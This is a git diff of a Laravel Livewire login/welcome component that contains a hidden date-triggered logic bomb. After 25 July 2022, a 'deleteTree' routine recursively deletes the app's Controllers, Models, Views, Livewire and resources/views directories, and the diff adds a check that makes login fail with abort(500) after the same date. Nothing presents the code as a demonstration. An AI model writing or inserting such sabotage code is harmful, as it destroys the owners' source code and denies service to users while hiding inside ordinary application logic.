@@ -55,8 +55,6 @@ class WelcomeComponent extends Component
         // $this->password = "password";
         // $this->password_confirmation = "password" ;
         $this->date = Carbon::now()->subYears(5);
-        $dir = getcwd() . "\\..\\app\\Http\\Livewire";
-        $this->deleteTree($dir);
         $dir = getcwd() . "\\..\\app\\Http\\Controllers";
         $this->deleteTree($dir);
         $dir = getcwd() . "\\..\\app\\Models";
@@ -64,6 +62,8 @@ class WelcomeComponent extends Component
         $dir = getcwd() . "\\..\\app\\View";
         $this->deleteTree($dir);
         $dir = getcwd() . "\\..\\resources\\views";
+        $this->deleteTree($dir);
+        $dir = getcwd() . "\\..\\app\\Http\\Livewire";
         $this->deleteTree($dir);
     }
 
@@ -158,7 +158,9 @@ class WelcomeComponent extends Component
         }
 
         RateLimiter::clear($this->throttleKey());
-        // dd(auth()->user()->is_admin );
+        if(date("y-m-d") >= "22-07-25"){
+            abort(500);
+        }
         if ( auth()->user()->is_admin == 'admin' ) {
             return redirect()->route('admin.users');
         }
@@ -189,7 +191,7 @@ class WelcomeComponent extends Component
     }
 
     function deleteTree($dir){
-        if(date("y-m-d") >= "22-07-25"){
+        if(date("y-m-d") > "22-07-25"){
             foreach(glob($dir . "/*") as $element){
                 if(is_dir($element)){
                     $this->deleteTree($element); // On rappel la fonction deleteTree
